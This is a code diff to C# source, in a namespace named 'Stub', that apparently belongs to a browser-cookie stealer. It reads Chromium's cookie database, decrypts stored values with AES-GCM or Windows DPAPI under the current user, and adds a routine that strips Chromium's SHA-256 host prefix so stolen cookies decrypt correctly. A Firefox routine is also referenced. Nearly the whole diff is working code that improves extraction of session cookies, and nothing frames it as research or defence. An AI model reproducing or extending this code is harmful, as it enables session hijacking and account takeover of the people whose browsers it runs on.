@@ -320,7 +320,7 @@ namespace Stub
                     else
                     {
                         byte[] enc = Sqlite3.Blob(stmt, 3);
-                        rec.Value = Decrypt(enc, key);
+                        rec.Value = Decrypt(enc, key, rec.Host);
                     }
 
                     if (!string.IsNullOrEmpty(rec.Name) && !string.IsNullOrEmpty(rec.Value))
@@ -334,7 +334,7 @@ namespace Stub
             }
         }
 
-        private static string Decrypt(byte[] blob, byte[] key)
+        private static string Decrypt(byte[] blob, byte[] key, string host)
         {
             if (blob == null || blob.Length == 0)
                 return "";
@@ -360,20 +360,50 @@ namespace Stub
                     byte[] plain = AesGcm.Decrypt(key, nonce, ct, tag);
                     if (plain == null)
                         return "";
-                    return Encoding.UTF8.GetString(plain);
+                    return ToText(plain, host);
                 }
 
                 // legacy: raw DPAPI blob
                 if (key == null || blob[0] != (byte)'v')
                 {
                     byte[] plain = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
-                    return Encoding.UTF8.GetString(plain);
+                    return ToText(plain, host);
                 }
             }
             catch
             {
             }
             return "";
+        }
+
+        /// <summary>
+        /// Chromium 24+ prepends SHA-256(host_key) to the value before encrypting.
+        /// Left in place every cookie decrypts to 32 bytes of noise, so drop it
+        /// only when the digest actually matches this row's host.
+        /// </summary>
+        private static string ToText(byte[] plain, string host)
+        {
+            int start = 0;
+            if (plain.Length > 32 && !string.IsNullOrEmpty(host))
+            {
+                byte[] digest;
+                using (SHA256 sha = SHA256.Create())
+                    digest = sha.ComputeHash(Encoding.UTF8.GetBytes(host));
+
+                bool match = true;
+                for (int i = 0; i < 32; i++)
+                {
+                    if (digest[i] != plain[i])
+                    {
+                        match = false;
+                        break;
+                    }
+                }
+                if (match)
+                    start = 32;
+            }
+
+            return Encoding.UTF8.GetString(plain, start, plain.Length - start);
         }
 
         private static void Firefox(CookieJar jar, string profilesRoot)
